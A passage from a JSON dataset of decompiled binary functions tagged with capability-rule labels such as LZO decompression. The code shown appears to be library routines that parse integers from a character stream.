        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint64_t __cdecl\nfcn.0044cb30(uint arg_8h, uint arg_ch, int32_t *arg_10h, int32_t arg_14h, uint arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    bool bVar4;\n    uint64_t uVar5;\n    int32_t *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    var_20h = fcn.0046ba90(0, 0, &var_1ch);\n    fcn.0046d280(0x20);\n    uVar5 = fcn.0044bd00(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, &var_20h);\n    var_34h = uVar5;\n    var_1ch = fcn.0048f260();\n    fcn.0049dd30(var_20h, arg_20h, arg_1ch, &var_1ch);\n    bVar3 = uVar5 >> 0x20 == -1;\n    bVar4 = var_34h != NULL && bVar3;\n    if ((bVar4) && (bVar3 = false,  var_34h[3] <= var_34h[2])) {\n        iVar2 = (**(*var_34h + 0x24))();\n        if (iVar2 == -1) {\n            var_34h = NULL;\n        }\n        bVar3 = iVar2 == -1 && bVar4;\n    }\n    bVar4 = arg_14h == -1;\n    if (((arg_10h != NULL) && (bVar4)) && (bVar4 = false,  arg_10h[3] <= arg_10h[2])) {\n        iVar2 = (**(*arg_10h + 0x24))();\n        bVar4 = iVar2 == -1;\n    }\n    if (bVar4 == bVar3) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (*0x4f59f4 == 0) {\n        iVar2 = *(var_20h + -4);\n        *(var_20h + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_20h + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar5 & 0xffffffff00000000 | ZEXT48(var_34h);\n    }\n    fcn.0046bf60(&var_1ch);\n    return uVar5 & 0xffffffff00000000 | ZEXT48(var_34h);\n}\n",
        "token_count": 689
    },
    "0044cce0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint64_t __cdecl\nfcn.0044cce0(uint arg_8h, uint arg_ch, int32_t *arg_10h, int32_t arg_14h, uint arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    bool bVar4;\n    uint64_t uVar5;\n    int32_t *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    var_20h = fcn.0046ba90(0, 0, &var_1ch);\n    fcn.0046d280(0x20);\n    uVar5 = fcn.0044bd00(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, &var_20h);\n    var_34h = uVar5;\n    var_1ch = fcn.0048f260();\n    fcn.0049de40(var_20h, arg_20h, arg_1ch, &var_1ch);\n    bVar3 = uVar5 >> 0x20 == -1;\n    bVar4 = var_34h != NULL && bVar3;\n    if ((bVar4) && (bVar3 = false,  var_34h[3] <= var_34h[2])) {\n        iVar2 = (**(*var_34h + 0x24))();\n        if (iVar2 == -1) {\n            var_34h = NULL;\n        }\n        bVar3 = iVar2 == -1 && bVar4;\n    }\n    bVar4 = arg_14h == -1;\n    if (((arg_10h != NULL) && (bVar4)) && (bVar4 = false,  arg_10h[3] <= arg_10h[2])) {\n        iVar2 = (**(*arg_10h + 0x24))();\n        bVar4 = iVar2 == -1;\n    }\n    if (bVar4 == bVar3) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (*0x4f59f4 == 0) {\n        iVar2 = *(var_20h + -4);\n        *(var_20h + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_20h + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar5 & 0xffffffff00000000 | ZEXT48(var_34h);\n    }\n    fcn.0046bf60(&var_1ch);\n    return uVar5 & 0xffffffff00000000 | ZEXT48(var_34h);\n}\n",
        "token_count": 689
    },
    "0044cef0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0044cef0(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    int16_t *piVar1;\n    uint8_t uVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    char cVar6;\n    int16_t iVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    bool bVar10;\n    bool bVar11;\n    bool bVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint *var_60h;\n    uint var_5ch;\n    uint var_57h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint8_t var_43h;\n    uint8_t var_42h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_ch;\n    \n    iVar4 = arg_18h;\n    iVar8 = fcn.0042e500(arg_18h + 0x6c);\n    var_40h = 8;\n    uVar18 = *(iVar4 + 0xc) & 0x4a;\n    if ((uVar18 != 0x40) && (var_40h = 10,  uVar18 == 8)) {\n        var_40h = 0x10;\n    }\n    bVar11 = arg_8h != NULL && arg_ch == -1;\n    bVar10 = arg_ch == -1;\n    if (bVar11) {\n        if (arg_8h[2] < arg_8h[3]) {\n            iVar7 = *arg_8h[2];\n        }\n        else {\n            iVar7 = (**(*arg_8h + 0x24))();\n        }\n        bVar10 = false;\n        if (iVar7 == -1) {\n            arg_8h = NULL;\n            bVar10 = bVar11;\n        }\n    }\n    bVar12 = arg_10h != NULL && arg_14h == -1;\n    bVar11 = arg_14h == -1;\n    if (bVar12) {\n        if (arg_10h[2] < arg_10h[3]) {\n            iVar7 = *arg_10h[2];\n        }\n        else {\n            iVar7 = (**(*arg_10h + 0x24))();\n        }\n        bVar11 = false;\n        if (iVar7 == -1) {\n            arg_10h = NULL;\n            bVar11 = bVar12;\n        }\n    }\n    if (bVar11 == bVar10) {\n        cVar6 = *(iVar8 + 0x10);\n        bVar11 = false;\n        uVar17 = 0;\n        uVar19 = 0;\n        var_42h = 1;\n        bVar10 = false;\n    }\n    else {\n        uVar17 = arg_ch & 0xffff;\n        if ((arg_8h != NULL) && (arg_ch == -1)) {\n            if (arg_8h[2] < arg_8h[3]) {\n                uVar17 = *arg_8h[2];\n            }\n            else {\n                uVar17 = (**(*arg_8h + 0x24))();\n            }\n            if (uVar17 == -1) {\n                arg_8h = NULL;\n            }\n        }\n        cVar6 = *(iVar8 + 0x10);\n        iVar7 = uVar17;\n        bVar11 = *(iVar8 + 0x70) == iVar7;\n        if ((bVar11) || (*(iVar8 + 0x72) == iVar7)) {\n            if (((cVar6 == '\\0') || (*(iVar8 + 0x26) != iVar7)) && (*(iVar8 + 0x24) != iVar7)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 2;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_42h = fcn.00430e20(&arg_10h);\n                if (var_42h != 0) {\n                    cVar6 = *(iVar8 + 0x10);\n                    uVar19 = 0;\n                    bVar10 = false;\n                    goto code_r0x0044d0ca;\n                }\n                uVar17 = fcn.00430f10();\n                cVar6 = *(iVar8 + 0x10);\n            }\n        }\n        else {\n            bVar11 = false;\n        }\n        bVar10 = false;\n        uVar19 = 0;\n        do {\n            iVar7 = uVar17;\n            if ((cVar6 != '\\0') && (*(iVar8 + 0x26) == iVar7)) {\n                var_42h = 0;\n                if (var_40h != 0x10) goto code_r0x0044d0d7;\n                var_28h = var_28h & 0xffffff00;\n                var_50h = 0x16;\n                goto code_r0x0044d740;\n            }\n            if (*(iVar8 + 0x24) == iVar7) break;\n            if (*(iVar8 + 0x78) == iVar7) {\n                bVar12 = var_40h == 10 | bVar10 ^ 1U;\n                if (!bVar12) goto code_r0x0044d032;\n                bVar10 = uVar18 == 0 || var_40h == 8;\n                if (uVar18 != 0 && var_40h != 8) {\n                    uVar19 = uVar19 + 1;\n                    goto code_r0x0044d066;\n                }\n                uVar19 = 0;\n                var_40h = 8;\n                uVar14 = arg_8h[2];\n                if (uVar14 < arg_8h[3]) goto code_r0x0044d075;\ncode_r0x0044d2b0:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x0044d084;\n                var_48h._0_1_ = true;\n            }\n            else {\n                if (!bVar10) break;\ncode_r0x0044d032:\n                if ((*(iVar8 + 0x74) != iVar7) && (*(iVar8 + 0x76) != iVar7)) {\n                    var_42h = 0;\n                    bVar10 = true;\n                    goto code_r0x0044d0ca;\n                }\n                var_42h = var_40h == 0x10 || uVar18 == 0;\n                if (var_40h != 0x10 && uVar18 != 0) {\n                    bVar10 = true;\n                    goto code_r0x0044d0d7;\n                }\n                bVar12 = false;\n                uVar19 = 0;\n                var_40h = 0x10;\ncode_r0x0044d066:\n                uVar14 = arg_8h[2];\n                bVar10 = bVar12;\n                if (arg_8h[3] <= uVar14) goto code_r0x0044d2b0;\ncode_r0x0044d075:\n                arg_8h[2] = uVar14 + 2;\ncode_r0x0044d084:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar7 = *arg_8h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_8h + 0x24))();\n                }\n                var_48h._0_1_ = false;\n                if (iVar7 == -1) {\n                    arg_8h = NULL;\n                    var_48h._0_1_ = true;\n                }\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar15 = arg_10h != NULL && arg_14h == -1;\n            bVar12 = arg_14h == -1;\n            if (bVar15) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar7 = *arg_10h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_10h + 0x24))();\n                }\n                bVar12 = false;\n                if (iVar7 == -1) {\n                    arg_10h = NULL;\n                    bVar12 = bVar15;\n                }\n            }\n            if (var_48h._0_1_ == bVar12) {\n                var_42h = 1;\n                cVar6 = *(iVar8 + 0x10);\n                goto code_r0x0044d0ca;\n            }\n            uVar17 = 0xffff;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar17 = *arg_8h[2];\n                }\n                else {\n                    uVar17 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar17 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            cVar6 = *(iVar8 + 0x10);\n        } while (bVar10);\n        var_42h = 0;\n    }\ncode_r0x0044d0ca:\n    var_50h = 0x16;\n    if (var_40h != 0x10) {\ncode_r0x0044d0d7:\n        var_50h = var_40h;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (cVar6 != '\\0') {\ncode_r0x0044d740:\n        stack0xffffffcc = &var_28h;\n        var_2ch = 0;\n        fcn.004924e0(0x20);\n    }\n    uVar5 = var_42h;\n    var_60h = &var_28h;\n    uVar18 = 0xffffffff / var_40h;\n    uVar2 = *(iVar8 + 0xa4);\n    if (uVar2 == 0) {\n        if (var_42h == 0) {\n            var_43h = 0;\n            var_48h = 0;\ncode_r0x0044d138:\n            uVar16 = uVar17;\n            uVar17 = uVar17 & 0xffff;\n            if (var_50h < 0xb) {\n                if ((uVar16 < 0x30) || (var_50h + 0x30U <= uVar16)) goto code_r0x0044d360;\n            }\n            else if (9 < uVar16 - 0x30) goto code_r0x0044d33d;\n            uVar17 = uVar17 - 0x30;\ncode_r0x0044d15c:\n            if (uVar17 != 0xffffffff) {\n                do {\n                    if (uVar18 < var_48h) {\n                        var_43h = 1;\n                        uVar17 = arg_8h[2];\n                        if (uVar17 < arg_8h[3]) goto code_r0x0044d19a;\ncode_r0x0044d3f3:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0044d1a9;\n                        var_4ch._0_1_ = true;\n                    }\n                    else {\n                        var_43h = var_43h | ~uVar17 < var_48h * var_40h;\n                        var_48h = uVar17 + var_48h * var_40h;\n                        uVar19 = uVar19 + 1;\n                        uVar17 = arg_8h[2];\n                        if (arg_8h[3] <= uVar17) goto code_r0x0044d3f3;\ncode_r0x0044d19a:\n                        arg_8h[2] = uVar17 + 2;\ncode_r0x0044d1a9:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar7 = *arg_8h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_8h + 0x24))();\n                        }\n                        var_4ch._0_1_ = false;\n                        if (iVar7 == -1) {\n                            arg_8h = NULL;\n                            var_4ch._0_1_ = true;\n                        }\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar15 = arg_10h != NULL && arg_14h == -1;\n                    bVar12 = arg_14h == -1;\n                    if (bVar15) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar7 = *arg_10h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar12 = false;\n                        if (iVar7 == -1) {\n                            arg_10h = NULL;\n                            bVar12 = bVar15;\n                        }\n                    }\n                    if (var_4ch._0_1_ == bVar12) {\n                        uVar2 = 1;\n                        goto code_r0x0044d1ee;\n                    }\n                    uVar17 = 0xffff;\n                    if (arg_8h == NULL) goto code_r0x0044d138;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar17 = *arg_8h[2];\n                    }\n                    else {\n                        uVar17 = (**(*arg_8h + 0x24))();\n                    }\n                    uVar16 = uVar17;\n                    if (uVar16 != 0xffff) goto code_r0x0044d138;\n                    arg_8h = NULL;\n                    if (var_50h < 0xb) break;\n                    uVar17 = 0xffff;\ncode_r0x0044d33d:\n                    if (5 < uVar16 - 0x61) goto code_r0x0044d4c0;\n                    uVar17 = uVar17 - 0x57;\n                    if (uVar17 == 0xffffffff) break;\n                } while( true );\n            }\n            goto code_r0x0044d360;\n        }\n        var_43h = 0;\n        var_42h = 0;\n        var_48h = 0;\n        uVar2 = uVar5;\n    }\n    else {\n        if (var_42h == 0) {\n            piVar1 = iVar8 + 0x78;\n            var_43h = 0;\n            var_48h = 0;\ncode_r0x0044d500:\n            uVar14 = var_2ch;\n            iVar7 = uVar17;\n            if ((*(iVar8 + 0x10) == 0) || (*(iVar8 + 0x26) != iVar7)) {\n                if (iVar7 == *(iVar8 + 0x24)) goto code_r0x0044d360;\n                iVar3 = *piVar1;\n                piVar9 = piVar1;\n                uVar17 = var_50h;\n                while (iVar3 != iVar7) {\n                    piVar9 = piVar9 + 1;\n                    uVar17 = uVar17 - 1;\n                    if (uVar17 == 0) goto code_r0x0044d360;\n                    iVar3 = *piVar9;\n                }\n                uVar17 = piVar9 - piVar1 >> 1;\n                if (0x1e < piVar9 - piVar1) {\n                    uVar17 = uVar17 - 6;\n                }\n                if (var_48h <= uVar18) {\n                    uVar14 = var_48h * var_40h;\n                    var_48h = uVar17 + uVar14;\n                    var_43h = var_43h | ~uVar17 < uVar14;\n                    uVar19 = uVar19 + 1;\n                    goto code_r0x0044d553;\n                }\n                uVar17 = arg_8h[2];\n                var_43h = uVar2;\n                if (uVar17 < arg_8h[3]) goto code_r0x0044d562;\ncode_r0x0044d628:\n                (**(*arg_8h + 0x28))();\n                var_57h._1_1_ = uVar2;\n                if (arg_8h != NULL) goto code_r0x0044d571;\n            }\n            else {\n                if (uVar19 == 0) {\n                    var_42h = *(iVar8 + 0x10);\n                    uVar2 = 0;\n                    goto code_r0x0044d1ee;\n                }\n                uVar17 = var_2ch + 1;\n                uVar13 = 0xf;\n                if (stack0xffffffcc != var_60h) {\n                    uVar13 = var_28h;\n                }\n                if (uVar13 < uVar17) {\n                    fcn.00492830(var_2ch, 0, 0, 1);\n                }\n                *(stack0xffffffcc + uVar14) = uVar19;\n                *(stack0xffffffcc + uVar17) = 0;\n                uVar19 = 0;\n                var_2ch = uVar17;\ncode_r0x0044d553:\n                uVar17 = arg_8h[2];\n                if (arg_8h[3] <= uVar17) goto code_r0x0044d628;\ncode_r0x0044d562:\n                arg_8h[2] = uVar17 + 2;\ncode_r0x0044d571:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar7 = *arg_8h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_8h + 0x24))();\n                }\n                var_57h._1_1_ = 0;\n                if (iVar7 == -1) {\n                    arg_8h = NULL;\n                    var_57h._1_1_ = uVar2;\n                }\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar15 = arg_10h != NULL && arg_14h == -1;\n            bVar12 = arg_14h == -1;\n            if (bVar15) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar7 = *arg_10h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_10h + 0x24))();\n                }\n                bVar12 = false;\n                if (iVar7 == -1) {\n                    arg_10h = NULL;\n                    bVar12 = bVar15;\n                }\n            }\n            if (bVar12 == var_57h._1_1_) goto code_r0x0044d1ee;\n            uVar17 = 0xffff;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar17 = *arg_8h[2];\n                }\n                else {\n                    uVar17 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar17 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            goto code_r0x0044d500;\n        }\n        var_48h = 0;\n        var_43h = 0;\n        var_42h = 0;\n        uVar2 = uVar5;\n    }\ncode_r0x0044d1ee:\n    if (var_2ch != 0) goto code_r0x0044d36f;\ncode_r0x0044d200:\n    if ((uVar19 != 0) || (bVar10)) {\ncode_r0x0044d3b1:\n        if (var_42h == 0) {\n            if (var_43h == 0) {\n                uVar18 = -var_48h;\n                if (!bVar11) {\n                    uVar18 = var_48h;\n                }\n                *arg_20h = uVar18;\n            }\n            else {\n                *arg_20h = 0xffffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x0044d224;\n        }\n    }\ncode_r0x0044d212:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x0044d224:\n    if (uVar2 != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != var_60h) {\n        fcn.004a34c0(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x0044d4c0:\n    if (5 < uVar16 - 0x41) goto code_r0x0044d360;\n    uVar17 = uVar17 - 0x37;\n    goto code_r0x0044d15c;\ncode_r0x0044d360:\n    uVar2 = 0;\n    if (var_2ch == 0) goto code_r0x0044d200;\ncode_r0x0044d36f:\n    fcn.004929c0(uVar19);\n    cVar6 = fcn.0049e840(*(iVar8 + 8), *(iVar8 + 0xc), &var_31h + 1);\n    if (cVar6 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar10) || ((uVar19 | var_2ch) != 0)) goto code_r0x0044d3b1;\n    goto code_r0x0044d212;\n}\n",
        "token_count": 5161
    },
    "0044d9a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0044d9a0(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    int16_t *piVar1;\n    uint8_t uVar2;\n    int16_t iVar3;\n    uint8_t uVar4;\n    char cVar5;\n    int16_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int16_t *piVar10;\n    bool bVar11;\n    bool bVar12;\n    bool bVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint var_68h;\n    uint *var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint8_t var_56h;\n    uint var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint8_t var_43h;\n    uint8_t var_42h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_ch;\n    \n    iVar9 = arg_18h;\n    iVar7 = fcn.0042e500(arg_18h + 0x6c);\n    var_40h = 8;\n    uVar18 = *(iVar9 + 0xc) & 0x4a;\n    if ((uVar18 != 0x40) && (var_40h = 10,  uVar18 == 8)) {\n        var_40h = 0x10;\n    }\n    bVar12 = arg_8h != NULL && arg_ch == -1;\n    bVar11 = arg_ch == -1;\n    if (bVar12) {\n        if (arg_8h[2] < arg_8h[3]) {\n            iVar6 = *arg_8h[2];\n        }\n        else {\n            iVar6 = (**(*arg_8h + 0x24))();\n        }\n        bVar11 = false;\n        if (iVar6 == -1) {\n            arg_8h = NULL;\n            bVar11 = bVar12;\n        }\n    }\n    bVar13 = arg_10h != NULL && arg_14h == -1;\n    bVar12 = arg_14h == -1;\n    if (bVar13) {\n        if (arg_10h[2] < arg_10h[3]) {\n            iVar6 = *arg_10h[2];\n        }\n        else {\n            iVar6 = (**(*arg_10h + 0x24))();\n        }\n        bVar12 = false;\n        if (iVar6 == -1) {\n            arg_10h = NULL;\n            bVar12 = bVar13;\n        }\n    }\n    if (bVar12 == bVar11) {\n        cVar5 = *(iVar7 + 0x10);\n        bVar12 = false;\n        uVar17 = 0;\n        uVar19 = 0;\n        var_42h = 1;\n        bVar11 = false;\n    }\n    else {\n        uVar17 = arg_ch & 0xffff;\n        if ((arg_8h != NULL) && (arg_ch == -1)) {\n            if (arg_8h[2] < arg_8h[3]) {\n                uVar17 = *arg_8h[2];\n            }\n            else {\n                uVar17 = (**(*arg_8h + 0x24))();\n            }\n            if (uVar17 == -1) {\n                arg_8h = NULL;\n            }\n        }\n        cVar5 = *(iVar7 + 0x10);\n        iVar6 = uVar17;\n        bVar12 = *(iVar7 + 0x70) == iVar6;\n        if ((bVar12) || (*(iVar7 + 0x72) == iVar6)) {\n            if (((cVar5 == '\\0') || (*(iVar7 + 0x26) != iVar6)) && (*(iVar7 + 0x24) != iVar6)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 2;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_42h = fcn.00430e20(&arg_10h);\n                if (var_42h != 0) {\n                    cVar5 = *(iVar7 + 0x10);\n                    uVar19 = 0;\n                    bVar11 = false;\n                    goto code_r0x0044db7a;\n                }\n                uVar17 = fcn.00430f10();\n                cVar5 = *(iVar7 + 0x10);\n            }\n        }\n        else {\n            bVar12 = false;\n        }\n        bVar11 = false;\n        uVar19 = 0;\n        do {\n            iVar6 = uVar17;\n            if ((cVar5 != '\\0') && (*(iVar7 + 0x26) == iVar6)) {\n                var_42h = 0;\n                if (var_40h != 0x10) goto code_r0x0044db87;\n                var_28h = var_28h & 0xffffff00;\n                var_50h = 0x16;\n                goto code_r0x0044e200;\n            }\n            if (*(iVar7 + 0x24) == iVar6) break;\n            if (*(iVar7 + 0x78) == iVar6) {\n                bVar13 = var_40h == 10 | bVar11 ^ 1U;\n                if (!bVar13) goto code_r0x0044dae2;\n                bVar11 = uVar18 == 0 || var_40h == 8;\n                if (uVar18 != 0 && var_40h != 8) {\n                    uVar19 = uVar19 + 1;\n                    goto code_r0x0044db16;\n                }\n                uVar19 = 0;\n                var_40h = 8;\n                uVar8 = arg_8h[2];\n                if (uVar8 < arg_8h[3]) goto code_r0x0044db25;\ncode_r0x0044dd60:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x0044db34;\n                var_48h._0_1_ = true;\n            }\n            else {\n                if (!bVar11) break;\ncode_r0x0044dae2:\n                if ((*(iVar7 + 0x74) != iVar6) && (*(iVar7 + 0x76) != iVar6)) {\n                    var_42h = 0;\n                    bVar11 = true;\n                    goto code_r0x0044db7a;\n                }\n                var_42h = var_40h == 0x10 || uVar18 == 0;\n                if (var_40h != 0x10 && uVar18 != 0) {\n                    bVar11 = true;\n                    goto code_r0x0044db87;\n                }\n                bVar13 = false;\n                uVar19 = 0;\n                var_40h = 0x10;\ncode_r0x0044db16:\n                uVar8 = arg_8h[2];\n                bVar11 = bVar13;\n                if (arg_8h[3] <= uVar8) goto code_r0x0044dd60;\ncode_r0x0044db25:\n                arg_8h[2] = uVar8 + 2;\ncode_r0x0044db34:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar6 = *arg_8h[2];\n                }\n                else {\n                    iVar6 = (**(*arg_8h + 0x24))();\n                }\n                var_48h._0_1_ = false;\n                if (iVar6 == -1) {\n                    arg_8h = NULL;\n                    var_48h._0_1_ = true;\n                }\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar15 = arg_10h != NULL && arg_14h == -1;\n            bVar13 = arg_14h == -1;\n            if (bVar15) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar6 = *arg_10h[2];\n                }\n                else {\n                    iVar6 = (**(*arg_10h + 0x24))();\n                }\n                bVar13 = false;\n                if (iVar6 == -1) {\n                    arg_10h = NULL;\n                    bVar13 = bVar15;\n                }\n            }\n            if (bVar13 == var_48h._0_1_) {\n                var_42h = 1;\n                cVar5 = *(iVar7 + 0x10);\n                goto code_r0x0044db7a;\n            }\n            uVar17 = 0xffff;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar17 = *arg_8h[2];\n                }\n                else {\n                    uVar17 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar17 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            cVar5 = *(iVar7 + 0x10);\n        } while (bVar11);\n        var_42h = 0;\n    }\ncode_r0x0044db7a:\n    var_50h = 0x16;\n    if (var_40h != 0x10) {\ncode_r0x0044db87:\n        var_50h = var_40h;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (cVar5 != '\\0') {\ncode_r0x0044e200:\n        stack0xffffffcc = &var_28h;\n        var_2ch = 0;\n        fcn.004924e0(0x20);\n    }\n    uVar4 = var_42h;\n    var_64h = &var_28h;\n    uVar18 = bVar12 + 0x7fffffff;\n    uVar2 = *(iVar7 + 0xa4);\n    if (uVar2 == 0) {\n        if (var_42h == 0) {\n            var_43h = 0;\n            var_48h = 0;\ncode_r0x0044dbf1:\n            uVar16 = uVar17;\n            uVar17 = uVar17 & 0xffff;\n            if (var_50h < 0xb) {\n                if ((uVar16 < 0x30) || (var_50h + 0x30U <= uVar16)) goto code_r0x0044de10;\n            }\n            else if (9 < uVar16 - 0x30) goto code_r0x0044dded;\n            iVar9 = uVar17 - 0x30;\ncode_r0x0044dc15:\n            if (iVar9 != -1) {\n                do {\n                    if (uVar18 / var_40h < var_48h) {\n                        var_43h = 1;\n                        uVar17 = arg_8h[2];\n                        if (uVar17 < arg_8h[3]) goto code_r0x0044dc54;\ncode_r0x0044dea6:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0044dc63;\n                        var_4ch._0_1_ = true;\n                    }\n                    else {\n                        var_43h = var_43h | uVar18 - iVar9 < var_48h * var_40h;\n                        var_48h = iVar9 + var_48h * var_40h;\n                        uVar19 = uVar19 + 1;\n                        uVar17 = arg_8h[2];\n                        if (arg_8h[3] <= uVar17) goto code_r0x0044dea6;\ncode_r0x0044dc54:\n                        arg_8h[2] = uVar17 + 2;\ncode_r0x0044dc63:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar6 = *arg_8h[2];\n                        }\n                        else {\n                            iVar6 = (**(*arg_8h + 0x24))();\n                        }\n                        var_4ch._0_1_ = false;\n                        if (iVar6 == -1) {\n                            arg_8h = NULL;\n                            var_4ch._0_1_ = true;\n                        }\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar15 = arg_10h != NULL && arg_14h == -1;\n                    bVar13 = arg_14h == -1;\n                    if (bVar15) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar6 = *arg_10h[2];\n                        }\n                        else {\n                            iVar6 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar13 = false;\n                        if (iVar6 == -1) {\n                            arg_10h = NULL;\n                            bVar13 = bVar15;\n                        }\n                    }\n                    if (var_4ch._0_1_ == bVar13) {\n                        uVar2 = 1;\n                        goto code_r0x0044dca8;\n                    }\n                    uVar17 = 0xffff;\n                    if (arg_8h == NULL) goto code_r0x0044dbf1;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar17 = *arg_8h[2];\n                    }\n                    else {\n                        uVar17 = (**(*arg_8h + 0x24))();\n                    }\n                    uVar16 = uVar17;\n                    if (uVar16 != 0xffff) goto code_r0x0044dbf1;\n                    arg_8h = NULL;\n                    if (var_50h < 0xb) break;\n                    uVar17 = 0xffff;\ncode_r0x0044dded:\n                    if (5 < uVar16 - 0x61) goto code_r0x0044df80;\n                    iVar9 = uVar17 - 0x57;\n                    if (iVar9 == -1) break;\n                } while( true );\n            }\n            goto code_r0x0044de10;\n        }\n        var_43h = 0;\n        var_42h = 0;\n        var_48h = 0;\n        uVar2 = uVar4;\n    }\n    else {\n        if (var_42h == 0) {\n            